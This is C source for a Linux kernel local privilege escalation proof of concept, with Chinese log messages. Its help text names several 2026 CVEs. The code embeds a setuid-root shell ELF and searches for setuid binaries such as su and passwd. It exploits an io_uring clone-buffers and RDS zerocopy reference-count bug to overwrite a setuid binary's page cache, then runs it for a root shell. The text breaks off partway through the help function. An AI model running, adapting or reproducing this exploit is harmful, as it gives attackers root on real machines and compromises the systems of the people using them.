#define IORING_REGISTER_CLONE_BUFFERS 25
struct io_uring_clone_buffers {
	__u32 src_fd;
	__u32 flags;
	__u32 nr;      /* 0 = 克隆全部 */
	__u32 pad[5];
};
#endif

/* 129 字节 setuid(0)+execve("/bin/sh") 的最小 ELF */
static const uint8_t uaf_shell_elf[129] = {
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x03,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x38,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x81,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x81,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0xb0,0x69,0x0f,0x05,0x48,0x8d,
	0x3d,0xdb,0xff,0xff,0xff,0x6a,0x00,0x57,0x48,0x89,0xe6,0x31,0xd2,0xb0,0x3b,0x0f,
	0x05,
};

static const char *uaf_suid_candidates[] = {
	"/usr/bin/su", "/bin/su", "/usr/bin/mount", "/usr/bin/passwd",
	"/usr/bin/chsh", "/usr/bin/newgrp", "/usr/bin/umount",
	"/usr/bin/pkexec", NULL,
};

/*
 * uaf_draw_chain — visualise the 3-node handle→pointer→page relationship.
 *
 *  [io_uring bvec]  ──arr──▶  [struct page *]  ──arr──▶  [page state]
 *
 * c1/c3:  ANSI color for the left/right boxes.
 * carr/arr: ANSI color + exactly 11-display-column arrow string.
 * tag1:   ≤18 chars, status label for the bvec box.
 * l3a/l3b: ≤22 chars each, two content lines for the page-state box.
 */
static void uaf_draw_chain(
    const char *c1,   const char *tag1,
    const char *carr, const char *arr,
    const char *c3,   const char *l3a, const char *l3b)
{
    fprintf(stderr, "\n"
        /* top borders */
        "  %s┌────────────────────┐%s               "
          "┌──────────────────────┐               "
          "%s┌──────────────────────────┐%s\n"
        /* content row 1: arrow lives here */
        "  %s│  io_uring bvec     │%s  %s%s%s  "
          "│  struct page *       │  %s%s%s  "
          "%s│  %-22.22s  │%s\n"
        /* content row 2 */
        "  %s│  %-18.18s│%s               "
          "│  (kernel vaddr)      │               "
          "%s│  %-22.22s  │%s\n"
        /* bottom borders */
        "  %s└────────────────────┘%s               "
          "└──────────────────────┘               "
          "%s└──────────────────────────┘%s\n\n",
        c1, ANSI_RESET, c3, ANSI_RESET,
        c1, ANSI_RESET, carr, arr, ANSI_RESET, carr, arr, ANSI_RESET, c3, l3a, ANSI_RESET,
        c1, tag1, ANSI_RESET, c3, l3b, ANSI_RESET,
        c1, ANSI_RESET, c3, ANSI_RESET);
}

static void uaf_hexdump(const char *label, const void *data, size_t len) {
    const uint8_t *p = data;
    if (label)
        fprintf(stderr, ANSI_CYAN "[*]" ANSI_RESET " %s (%zu bytes):\n", label, len);
    for (size_t i = 0; i < len; i += 16) {
        fprintf(stderr, ANSI_CYAN "  %04zx:" ANSI_RESET "  ", i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < len)
                fprintf(stderr, ANSI_YELLOW "%02x " ANSI_RESET, p[i + j]);
            else
                fprintf(stderr, "   ");
            if (j == 7) fprintf(stderr, " ");
        }
        fprintf(stderr, " " ANSI_GREEN "|");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            uint8_t c = p[i + j];
            fprintf(stderr, "%c", (c >= 0x20 && c < 0x7f) ? c : '.');
        }
        fprintf(stderr, "|" ANSI_RESET "\n");
    }
    fprintf(stderr, "\n");
}

static int uaf_pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0) {
        perror("sched_setaffinity");
        return 0;
    }
    return 1;
}

static const char *uaf_find_suid_target(void) {
    for (int i = 0; uaf_suid_candidates[i]; i++) {
        struct stat st;
        if (stat(uaf_suid_candidates[i], &st) == 0 && (st.st_mode & S_ISUID)) {
            LOG("命中 setuid 目标: %s", uaf_suid_candidates[i]);
            return uaf_suid_candidates[i];
        }
    }
    return NULL;
}

static int uaf_backup_target(const char *path) {
    const char *name = strrchr(path, '/');
    name = name ? name + 1 : path;
    char backup[256];
    snprintf(backup, sizeof(backup), "/tmp/.backup_%s_%d", name, getpid());
    LOG("备份 %s -> %s", path, backup);

    int src = open(path, O_RDONLY);
    if (src < 0) { perror("open src"); return -1; }
    int dst = open(backup, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (dst < 0) { perror("open dst"); close(src); return -1; }

    char tmp[4096];
    ssize_t n;
    while ((n = read(src, tmp, sizeof(tmp))) > 0) {
        if (write(dst, tmp, n) != n) { perror("write"); close(src); close(dst); return -1; }
    }
    close(src);
    close(dst);
    LOG("备份完成: %s", backup);
    return 0;
}

static int uaf_steal_one_ref(void *page_addr, int port) {
    int fd = socket(AF_RDS, SOCK_SEQPACKET, 0);
    if (fd < 0) return -1;

    int v = 1;
    setsockopt(fd, SOL_SOCKET, SO_ZEROCOPY, &v, sizeof(v));
    int sndbuf = 2 * 4096 * 4;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    v = 2;
    setsockopt(fd, SOL_RDS, SO_RDS_TRANSPORT, &v, sizeof(v));

    struct sockaddr_in a = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
        .sin_port = htons(port),
    };
    if (bind(fd, (struct sockaddr *)&a, sizeof(a)) < 0) {
        close(fd);
        return -1;
    }

    a.sin_port = htons(port + 1);
    struct iovec iov = { page_addr, 2 * UAF_PGSZ };

    char cb[CMSG_SPACE(sizeof(uint32_t))];
    memset(cb, 0, sizeof(cb));
    struct cmsghdr *cm = (struct cmsghdr *)cb;
    cm->cmsg_level = SOL_RDS;
    cm->cmsg_type = RDS_CMSG_ZCOPY_COOKIE;
    cm->cmsg_len = CMSG_LEN(sizeof(uint32_t));

    struct msghdr m = {
        .msg_name = &a,
        .msg_namelen = sizeof(a),
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = cb,
        .msg_controllen = sizeof(cb),
    };
    sendmsg(fd, &m, MSG_ZEROCOPY | MSG_DONTWAIT);
    close(fd);
    return 0;
}

struct uaf_ring {
    int fd;
    void *sq_ring;
    void *cq_ring;
    struct io_uring_sqe *sqes;
    uint32_t *sq_head;
    uint32_t *sq_tail;
    uint32_t *sq_mask;
    uint32_t *sq_array;
    uint32_t *cq_head;
    uint32_t *cq_tail;
    uint32_t *cq_mask;
    struct io_uring_cqe *cqes;
    size_t sq_ring_sz;
    size_t cq_ring_sz;
    size_t sqes_sz;
};

static int uaf_ring_setup(struct uaf_ring *r, unsigned entries) {
    struct io_uring_params p;
    memset(&p, 0, sizeof(p));

    r->fd = syscall(__NR_io_uring_setup, entries, &p);
    if (r->fd < 0) {
        int e = errno;

        perror("io_uring_setup");
        errno = e;   /* perror 会改 errno, 上层要拿到真实错误码 */
        return -1;
    }

    r->sq_ring_sz = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    r->cq_ring_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
    r->sqes_sz = p.sq_entries * sizeof(struct io_uring_sqe);

    r->sq_ring = mmap(NULL, r->sq_ring_sz, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_SQ_RING);
    if (r->sq_ring == MAP_FAILED) { perror("mmap sq_ring"); return -1; }

    r->cq_ring = mmap(NULL, r->cq_ring_sz, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_CQ_RING);
    if (r->cq_ring == MAP_FAILED) { perror("mmap cq_ring"); return -1; }

    r->sqes = mmap(NULL, r->sqes_sz, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_SQES);
    if (r->sqes == MAP_FAILED) { perror("mmap sqes"); return -1; }

    r->sq_head  = r->sq_ring + p.sq_off.head;
    r->sq_tail  = r->sq_ring + p.sq_off.tail;
    r->sq_mask  = r->sq_ring + p.sq_off.ring_mask;
    r->sq_array = r->sq_ring + p.sq_off.array;
    r->cq_head  = r->cq_ring + p.cq_off.head;
    r->cq_tail  = r->cq_ring + p.cq_off.tail;
    r->cq_mask  = r->cq_ring + p.cq_off.ring_mask;
    r->cqes     = r->cq_ring + p.cq_off.cqes;

    if (!g_verbose)
        return 0;

    fprintf(stderr,
        ANSI_CYAN "[*]" ANSI_RESET " io_uring ring ready:\n"
        ANSI_CYAN "      fd"         ANSI_RESET " = " ANSI_YELLOW "%d\n"       ANSI_RESET
        ANSI_CYAN "      sq_entries" ANSI_RESET " = " ANSI_YELLOW "%u"         ANSI_RESET
        "  sq_ring @ " ANSI_WHITE "%p" ANSI_RESET "  (sz " ANSI_YELLOW "0x%zx" ANSI_RESET ")\n"
        ANSI_CYAN "      cq_entries" ANSI_RESET " = " ANSI_YELLOW "%u"         ANSI_RESET
        "  cq_ring @ " ANSI_WHITE "%p" ANSI_RESET "  (sz " ANSI_YELLOW "0x%zx" ANSI_RESET ")\n"
        ANSI_CYAN "      sqes"       ANSI_RESET "       @ " ANSI_WHITE "%p"    ANSI_RESET
        "  (sz " ANSI_YELLOW "0x%zx" ANSI_RESET ", each " ANSI_YELLOW "0x%zx" ANSI_RESET " bytes)\n",
        r->fd,
        p.sq_entries, r->sq_ring, r->sq_ring_sz,
        p.cq_entries, r->cq_ring, r->cq_ring_sz,
        r->sqes, r->sqes_sz, sizeof(struct io_uring_sqe));

    return 0;
}

static int uaf_ring_register(struct uaf_ring *r, void *buf, size_t len) {
    struct iovec iov = { .iov_base = buf, .iov_len = len };
    int ret = syscall(__NR_io_uring_register, r->fd,
                      IORING_REGISTER_BUFFERS, &iov, 1);
    if (ret < 0) {
        perror("io_uring_register buffers");
        return -1;
    }
    return 0;
}

static int uaf_ring_clone(struct uaf_ring *dst, struct uaf_ring *src) {
    struct io_uring_clone_buffers arg;
    memset(&arg, 0, sizeof(arg));
    arg.src_fd = src->fd;
    arg.flags = 0;
    arg.nr = 0; /* clone all */
    int ret = syscall(__NR_io_uring_register, dst->fd,
                      IORING_REGISTER_CLONE_BUFFERS, &arg, 1);
    if (ret < 0) {
        perror("io_uring clone buffers");
        return -1;
    }
    return 0;
}

/*
 * Fork a daemon child that holds ring2_fd open, preventing imu cleanup.
 * When ring1 is destroyed, io_buffer_unmap sees imu->refs > 1 and skips
 * the unpin_user_folio call that would corrupt the freed page's refcount.
 */
static pid_t uaf_spawn_holder(int ring2_fd) {
    pid_t pid = fork();
    if (pid != 0) return pid; /* parent */
    /* child: hold ring2_fd open forever */
    /* clear CLOEXEC so execl doesn't close it */
    fcntl(ring2_fd, F_SETFD, 0);
    /* close everything else */
    for (int fd = 0; fd < 1024; fd++)
        if (fd != ring2_fd) close(fd);
    /* become a daemon — just sleep */
    open("/dev/null", O_RDONLY); /* fd 0 */
    open("/dev/null", O_WRONLY); /* fd 1 */
    open("/dev/null", O_WRONLY); /* fd 2 */
    execl("/bin/sleep", "sleep", "99999", (char *)NULL);
    _exit(0);
}

static int uaf_submit_read(struct uaf_ring *r, int file_fd,
                                    void *buf, uint32_t len) {
    uint32_t tail = *r->sq_tail;
    uint32_t idx = tail & *r->sq_mask;

    struct io_uring_sqe *sqe = &r->sqes[idx];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_READ_FIXED;
    sqe->fd = file_fd;
    sqe->off = 0;
    sqe->addr = (uint64_t)(unsigned long)buf;
    sqe->len = len;
    sqe->buf_index = 0;
    sqe->user_data = 0x1234;

    fprintf(stderr,
        ANSI_CYAN "[*]" ANSI_RESET " SQE[" ANSI_YELLOW "%u" ANSI_RESET "] "
        ANSI_WHITE "IORING_OP_READ_FIXED" ANSI_RESET ":\n"
        "       fd        = " ANSI_YELLOW "%d\n"          ANSI_RESET
        "       addr      = " ANSI_WHITE  "0x%016llx\n"   ANSI_RESET
        "       len       = " ANSI_YELLOW "0x%x"          ANSI_RESET " (%u bytes)\n"
        "       buf_index = " ANSI_YELLOW "%u\n"          ANSI_RESET
        "       off       = " ANSI_YELLOW "0x%llx\n"      ANSI_RESET
        "       user_data = " ANSI_WHITE  "0x%llx\n"      ANSI_RESET,
        idx, file_fd,
        (unsigned long long)sqe->addr,
        sqe->len, sqe->len,
        (unsigned)sqe->buf_index,
        (unsigned long long)sqe->off,
        (unsigned long long)sqe->user_data);

    r->sq_array[idx] = idx;
    __atomic_store_n(r->sq_tail, tail + 1, __ATOMIC_RELEASE);

    int ret = syscall(__NR_io_uring_enter, r->fd, 1, 1,
                      IORING_ENTER_GETEVENTS, NULL, (size_t)0);
    if (ret < 0) {
        perror("io_uring_enter");
        return -1;
    }
    return 0;
}

static int uaf_wait_cqe(struct uaf_ring *r, int32_t *res_out) {
    uint32_t head = *r->cq_head;
    uint32_t tail;

    for (int i = 0; i < 1000; i++) {
        tail = __atomic_load_n(r->cq_tail, __ATOMIC_ACQUIRE);
        if (head != tail) break;
        usleep(1000);
    }
    tail = __atomic_load_n(r->cq_tail, __ATOMIC_ACQUIRE);
    if (head == tail) {
        WARN("等待 CQ 超时, 没有完成事件");
        return -1;
    }

    uint32_t idx = head & *r->cq_mask;
    struct io_uring_cqe *cqe = &r->cqes[idx];
    if (res_out) *res_out = cqe->res;
    __atomic_store_n(r->cq_head, head + 1, __ATOMIC_RELEASE);
    return 0;
}

static void uaf_ring_destroy(struct uaf_ring *r) {
    if (r->sq_ring != MAP_FAILED) munmap(r->sq_ring, r->sq_ring_sz);
    if (r->cq_ring != MAP_FAILED) munmap(r->cq_ring, r->cq_ring_sz);
    if (r->sqes != MAP_FAILED) munmap(r->sqes, r->sqes_sz);
    if (r->fd >= 0) close(r->fd);
    r->fd = -1;
}

static int uaf_create_payload(const uint8_t *content, size_t clen) {
    char path[] = "/tmp/.payload_XXXXXX";
    int fd = mkstemp(path);
    if (fd < 0) { perror("mkstemp"); return -1; }
    unlink(path);

    uint8_t page[UAF_PGSZ];
    memset(page, 0, sizeof(page));
    if (clen > UAF_PGSZ)
        clen = UAF_PGSZ;
    if (content && clen)
        memcpy(page, content, clen);

    if (write(fd, page, UAF_PGSZ) != UAF_PGSZ) {
        perror("write payload");
        close(fd);
        return -1;
    }
    return fd;
}

static int uaf_evict_page(const char *path, off_t off) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open for fadvise"); return -1; }
    if (posix_fadvise(fd, off, UAF_PGSZ, POSIX_FADV_DONTNEED) < 0) {
        perror("fadvise");
        close(fd);
        return -1;
    }
    close(fd);
    return 0;
}

static int uaf_attempt(const char *target, off_t page_off,
                       const uint8_t *content, size_t clen, int no_exec,
                       pid_t *daemon_out)
{
    LOG("=== 开始尝试 ===");

    /* 1. mmap anon page + PROT_NONE guard */
    void *buf = mmap(NULL, 2 * UAF_PGSZ, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) { perror("mmap buf"); return -1; }

    /* touch the page to ensure it's faulted in */
    memset(buf, 'A', UAF_PGSZ);

    /* set second page as PROT_NONE guard */
    if (mprotect((char *)buf + UAF_PGSZ, UAF_PGSZ, PROT_NONE) < 0) {
        perror("mprotect guard");
        munmap(buf, 2 * UAF_PGSZ);
        return -1;
    }
    LOG("映射 buf=%p, 保护页在 %p (PROT_NONE)", buf, (char *)buf + UAF_PGSZ);
    fprintf(stderr,
        ANSI_WHITE "  ┌─ page @ " ANSI_YELLOW "%p" ANSI_WHITE
        "  refcount:" ANSI_GREEN " 1" ANSI_WHITE " (PTE only)" ANSI_RESET "\n\n", buf);

    /* 2. io_uring setup + register buffer (pins page, refcount += 1024) */
    struct uaf_ring ring;
    memset(&ring, 0, sizeof(ring));
    ring.fd = -1;
    ring.sq_ring = MAP_FAILED;
    ring.cq_ring = MAP_FAILED;
    ring.sqes = MAP_FAILED;

    if (uaf_ring_setup(&ring, 4) < 0) {
        munmap(buf, 2 * UAF_PGSZ);
        return -3;   /* io_uring 不可用: 不必重试 */
    }
    if (uaf_ring_register(&ring, buf, UAF_PGSZ) < 0) {
        uaf_ring_destroy(&ring);
        munmap(buf, 2 * UAF_PGSZ);
        return -3;
    }
    LOG("io_uring 已注册缓冲 (页引用计数 ~1025)");
    uaf_draw_chain(
        ANSI_GREEN,  "REGISTERED (+1024)",
        ANSI_WHITE,  "──────────▶",
        ANSI_GREEN,  "anon page", "refcnt:1025  FOLL_PIN");

    /* 2b. Clone buffers to ring2 + spawn daemon to hold imu ref */
    struct uaf_ring ring2;
    memset(&ring2, 0, sizeof(ring2));
    ring2.fd = -1;
    ring2.sq_ring = MAP_FAILED;
    ring2.cq_ring = MAP_FAILED;
    ring2.sqes = MAP_FAILED;
    if (uaf_ring_setup(&ring2, 1) < 0) {
        uaf_ring_destroy(&ring);
        munmap(buf, 2 * UAF_PGSZ);
        return -1;
    }
    if (uaf_ring_clone(&ring2, &ring) < 0) {
        uaf_ring_destroy(&ring2);
        uaf_ring_destroy(&ring);
        munmap(buf, 2 * UAF_PGSZ);
        return -4;   /* 不支持 CLONE_BUFFERS: 老内核必然如此 */
    }
    LOG("缓冲已克隆到 ring2 (imu->refs = 2)");
    fprintf(stderr,
        ANSI_WHITE "  ├─ IORING_REGISTER_CLONE_BUFFERS → imu->refs:" ANSI_GREEN " 2\n"
        "  └─ ring2 fd will block io_buffer_unmap from calling unpin_user_folio" ANSI_RESET "\n\n");
    pid_t daemon = uaf_spawn_holder(ring2.fd);
    if (daemon < 0) {
        uaf_ring_destroy(&ring2);
        uaf_ring_destroy(&ring);
        munmap(buf, 2 * UAF_PGSZ);
        return -1;
    }
    /* parent closes ring2 — daemon holds the only ref to ring2 */
    uaf_ring_destroy(&ring2);
    LOG("守护进程 pid=%d 持有 ring2 (阻止 ring1 清理时 unpin)", daemon);
    *daemon_out = daemon;

    /* 3. steal 1024 refs via failing zcopy sends */
    LOG("开始偷取 %d 次页引用计数...", UAF_BIAS);
    int stolen = 0;
    for (int i = 0; i < UAF_BIAS; i++) {
        int port = UAF_PORT_BASE + i * 2;
        int ret = uaf_steal_one_ref(buf, port);
        if (ret < 0) {
            /* port in use or RDS unavailable, skip */
            continue;
        }
        stolen++;
        if (stolen % 256 == 0)
            LOG("  已偷取 %d/%d", stolen, UAF_BIAS);
    }
    LOG("共偷取 %d 次引用 (计数已降到 ~1)", stolen);
    uaf_draw_chain(
        ANSI_YELLOW, "refs stolen (1024)",
        ANSI_YELLOW, "──────────▶",
        ANSI_YELLOW, "anon page", "refcnt:~1  pin gone");

    if (stolen < UAF_BIAS) {
        WARN("只偷到 %d/%d, 可能不够",
            stolen, UAF_BIAS);
        if (stolen < UAF_BIAS - 10) {
            WARN("偷到的引用太少, 中止本次尝试");
            uaf_ring_destroy(&ring);
            munmap(buf, 2 * UAF_PGSZ);
            return -1;
        }
    }

    /* 4. evict suid binary from page cache BEFORE freeing our page */
    LOG("逐出 %s 的页缓存 (offset=0x%llx)...", target, (unsigned long long)page_off);
    if (uaf_evict_page(target, page_off) < 0) {
        WARN("逐出页缓存失败");
        uaf_ring_destroy(&ring);
        return -1;
    }
    LOG("页缓存已逐出");


    /* 6. drain PCP: allocate many pages to push stale entries out */
    LOG("排空 PCP 空闲链表...");
    void *drain_pages[256];
    for (int i = 0; i < 256; i++) {
        drain_pages[i] = mmap(NULL, UAF_PGSZ, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    }

    /* 7. munmap first page → refcount 1→0 → freed to TOP of PCP (LIFO) */
    LOG("munmap 触发释放 (引用 1 -> 0)...");
    if (munmap(buf, UAF_PGSZ) < 0) {
        perror("munmap buf");
        uaf_ring_destroy(&ring);
        return -1;
    }
    LOG("页已释放到 PCP 栈顶, io_uring 仍持有悬空 struct page*");
    uaf_draw_chain(
        ANSI_RED,    "DANGLING! (bvec)",
        ANSI_RED,    "─X────────▶",
        ANSI_RED,    "FREED  (PCP top)", "refcnt:0  PTE gone");

    /* 8. IMMEDIATELY read suid binary → page cache alloc grabs from PCP top */
    LOG("读取 %s 把刚释放的页抢回页缓存...", target);
    int tfd = open(target, O_RDONLY);
    if (tfd < 0) { perror("open target"); uaf_ring_destroy(&ring); return -1; }
    /* no fadvise — let the kernel do default readahead */
    uint8_t verify_buf[UAF_PGSZ];
    if (pread(tfd, verify_buf, UAF_PGSZ, page_off) < 0) {
        perror("pread target"); close(tfd); uaf_ring_destroy(&ring); return -1;
    }
    close(tfd);
    LOG("页缓存已重新占据该页");
    {
        char pcache_label[24];
        const char *bn = strrchr(target, '/');
        snprintf(pcache_label, sizeof(pcache_label), "%.18s  pg0", bn ? bn + 1 : target);
        uaf_draw_chain(
            ANSI_RED,    "DANGLING! (bvec)",
            ANSI_RED,    "──────────▶",
            ANSI_YELLOW, "page cache (live!)", pcache_label);
    }

    /* snapshot legitimate page content before we overwrite it */
    uint8_t before_buf[64] = {0};
    {
        int snap = open(target, O_RDONLY);
        if (snap >= 0) {
            if (pread(snap, before_buf, sizeof(before_buf), page_off) < 0)
                memset(before_buf, 0, sizeof(before_buf));
            close(snap);
        }
    }
    uaf_hexdump("page cache page 0 BEFORE overwrite (legitimate ELF)", before_buf, sizeof(before_buf));

    /* clean up drain pages AFTER page cache allocation */
    for (int i = 0; i < 256; i++)
        if (drain_pages[i] != MAP_FAILED) munmap(drain_pages[i], UAF_PGSZ);

    /* create payload file AFTER page cache allocation */
    uint8_t page_img[UAF_PGSZ];
    memset(page_img, 0, sizeof(page_img));
    if (content && clen) {
        if (clen > UAF_PGSZ) clen = UAF_PGSZ;
        memcpy(page_img, content, clen);
    }
    int payload_fd = uaf_create_payload(page_img, UAF_PGSZ);
    if (payload_fd < 0) {
        uaf_ring_destroy(&ring);
        return -1;
    }

    /* 9. READ_FIXED: DMA writes payload into page cache via dangling page */
    LOG("提交 IORING_OP_READ_FIXED, 用 DMA 覆盖页缓存...");
    if (uaf_submit_read(&ring, payload_fd, buf, UAF_PGSZ) < 0) {
        close(payload_fd);
        uaf_ring_destroy(&ring);
        return -1;
    }

    int32_t cqe_res;
    if (uaf_wait_cqe(&ring, &cqe_res) < 0) {
        close(payload_fd);
        uaf_ring_destroy(&ring);
        return -1;
    }
    close(payload_fd);

    if (cqe_res < 0) {
        WARN("READ_FIXED 完成事件出错: %d (%s)", cqe_res, strerror(-cqe_res));
        uaf_ring_destroy(&ring);
        return -1;
    }
    LOG("READ_FIXED 完成: 经 DMA 写入 %d 字节", cqe_res);
    uaf_draw_chain(
        ANSI_RED,    "UAF WRITE (bvec)",
        ANSI_RED,    "══DMA═════▶",
        ANSI_RED,    "PAGE CACHE PWNED", "our shellcode  \\o/");

    /* 9. verify overwrite */
    LOG("校验页缓存是否真的被改写...");
    tfd = open(target, O_RDONLY);
    if (tfd < 0) {
        perror("open target for verify");
        uaf_ring_destroy(&ring);
        return -1;
    }
    uint8_t check[UAF_PGSZ];
    if (pread(tfd, check, clen, page_off) != (ssize_t)clen) {
        perror("pread verify");
        close(tfd);
        uaf_ring_destroy(&ring);
        return -1;
    }
    close(tfd);

    uaf_hexdump("覆盖后的页缓存", check, clen > 64 ? 64 : clen);
    if (memcmp(check, content, clen) != 0) {
        int first_diff = -1;
        for (int i = 0; i < (int)clen; i++) {
            if (check[i] != content[i]) { first_diff = i; break; }
        }
        WARN("校验失败: 第一个不匹配字节在 %d", first_diff);
        if (first_diff >= 0) {
            WARN("  期望[%d]=%02x  实际[%d]=%02x",
                first_diff, content[first_diff], first_diff, check[first_diff]);
            WARN("  页缓存未被覆盖, io_uring 写到了别的页");
        }
        uaf_ring_destroy(&ring);
        return -1;
    }
    LOG("校验通过: 页缓存内容与 payload 一致");

    /* With clone fix, uaf_ring_destroy is safe — imu->refs > 1 skips unpin */
    uaf_ring_destroy(&ring);

    if (no_exec) {
        LOG("通用写完成, 按 -to/-set 语义不执行目标");
        return 0;
    }

    /* 10. exec suid binary → root shell */
    LOG("执行 %s (内容已换成 setuid(0)+execve(/bin/sh))...", target);
    fprintf(stderr, "\n");
    fprintf(stderr,
            ANSI_YELLOW ANSI_BOLD
            "=== 恢复方法: sudo cp /tmp/.backup_%s_%d %s && sudo chmod u+s %s ==="
            ANSI_RESET "\n",
            strrchr(target, '/') + 1, getpid(), target, target);
    fflush(stderr);

    /* close all fds > 2 EXCEPT ring fd doesn't matter, execl replaces us */
    for (int fd = 3; fd < 1024; fd++) close(fd);

    execl(target, target, (char *)NULL);
    perror("execl");
    return -1;
}

/* -check 用: 实际跑一遍 ring 注册/克隆, 判断内核是否具备本链能力。
 * 配置项 CONFIG_IO_URING=y 并不代表支持 CLONE_BUFFERS。 */
static void uaf_probe(void)
{
    struct uaf_ring r1, r2;
    void *buf;

    memset(&r1, 0, sizeof(r1));
    memset(&r2, 0, sizeof(r2));
    r1.fd = r2.fd = -1;

    buf = mmap(NULL, UAF_PGSZ, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) {
        pmsg("[!] mmap 探测页失败: %s\n", strerror(errno));
        return;
    }

    if (uaf_ring_setup(&r1, 2) < 0) {
        pmsg("[!] io_uring_setup 失败 (%s)\n", strerror(errno));
        pmsg("    容器/内核可能禁用了 io_uring -> 该链不可用\n");
        munmap(buf, UAF_PGSZ);
        return;
    }
    pmsg("[+] io_uring_setup 可用\n");

    if (uaf_ring_register(&r1, buf, UAF_PGSZ) < 0) {
        pmsg("[!] REGISTER_BUFFERS 失败: %s\n", strerror(errno));
        uaf_ring_destroy(&r1);
        munmap(buf, UAF_PGSZ);
        return;
    }
    pmsg("[+] REGISTER_BUFFERS 可用 (页被 pin, refcount +1024)\n");

    if (uaf_ring_setup(&r2, 1) < 0) {
        pmsg("[!] 第二个 ring 创建失败: %s\n", strerror(errno));
        uaf_ring_destroy(&r1);
        munmap(buf, UAF_PGSZ);
        return;
    }

    if (uaf_ring_clone(&r2, &r1) < 0) {
        pmsg("[!] REGISTER_CLONE_BUFFERS 不支持 (%s)\n", strerror(errno));
        pmsg("    这是本链的硬门槛, 需要 6.12+ 内核;\n");
        pmsg("    你的内核上该链不可用, 请改走 43284 / 43500 / 31431。\n");
    } else {
        pmsg("[+] REGISTER_CLONE_BUFFERS 可用 —— 该链具备运行条件\n");
    }

    uaf_ring_destroy(&r2);
    uaf_ring_destroy(&r1);
    munmap(buf, UAF_PGSZ);
}

/* 融合入口: 由主 main 调用。
 * target 为空则自动挑 setuid 目标; content 为空则用内置 shell ELF。
 * 成功时 execl(target) 不返回; 失败返回非 0。 */
static int uaf_lpe_main(const char *target, off_t page_off,
                        const uint8_t *content, size_t clen, int no_backup,
                        int no_exec)
{
    pid_t daemons[UAF_RETRIES];
    int ndaemons = 0;

    if (uaf_pin_cpu(0))
        LOG("已绑定到 CPU 0");

    if (!target || !*target)
        target = uaf_find_suid_target();
    if (!target) {
        WARN("未找到可用的 setuid 目标, 请用 -t <文件> 指定");
        return 1;
    }
    if (!content || !clen) {
        content = uaf_shell_elf;
        clen = sizeof(uaf_shell_elf);
    }
    if (page_off % UAF_PGSZ) {
        WARN("页偏移 0x%llx 未按 %d 对齐, 该链只能整页操作",
             (unsigned long long)page_off, UAF_PGSZ);
        return 2;
    }
    LOG("目标 %s, 页偏移 0x%llx, 写入 %zu 字节 (整页 %d)",
        target, (unsigned long long)page_off, clen, UAF_PGSZ);

    if (!no_backup && uaf_backup_target(target) < 0) {
        WARN("备份失败, 为安全起见中止");
        return 1;
    }

    int hard_fail = 0;

    for (int attempt = 0; attempt < UAF_RETRIES; attempt++) {
        pid_t daemon = 0;
        int ret;

        LOG("第 %d/%d 次尝试", attempt + 1, UAF_RETRIES);
        ret = uaf_attempt(target, page_off, content, clen, no_exec, &daemon);
        if (daemon > 0)
            daemons[ndaemons++] = daemon;
        if (ret == 0)
            return 0;   /* 已经 execl, 不会到这里 */
        if (ret == -3) {
            WARN("io_uring 不可用 (%s), 该链无法继续",
                 errno ? strerror(errno) : "EPERM/ENOSYS");
            hard_fail = 2;
            break;
        }
        if (ret == -4) {
            WARN("内核不支持 IORING_REGISTER_CLONE_BUFFERS (需 6.12+)");
            WARN("该链在 5.x / 6.6 上不可用, 请改用 43284 / 43500 / 31431");
            hard_fail = 3;
            break;
        }
        WARN("第 %d 次失败, 重试", attempt + 1);
        sleep(1);
    }

    for (int i = 0; i < ndaemons; i++) {
        kill(daemons[i], SIGKILL);
        waitpid(daemons[i], NULL, 0);
    }
    if (hard_fail)
        return hard_fail;
    WARN("%d 次尝试全部失败", UAF_RETRIES);
    return 1;
}

/* ===================== 分 CVE 的帮助 ===================== */

static void help_general(const char *prog)
{
	fprintf(stderr,
		"Dirty Frag 五链本地提权 PoC (中文日志版)\n"
		"\n"
		"  CVE-2026-31431   AF_ALG/AEAD   Copy Fail: 4 字节页缓存写 (门槛最低)\n"
		"  CVE-2026-43284   XFRM / ESP    写 setuid 文件页缓存 (每次 4 字节)\n"
		"  CVE-2026-43500   RxRPC / RXKAD 把 /etc/passwd 首行改成空密码\n"
		"  CVE-2026-43494   io_uring + RDS 页引用计数劫持, 整页替换 setuid 文件\n"
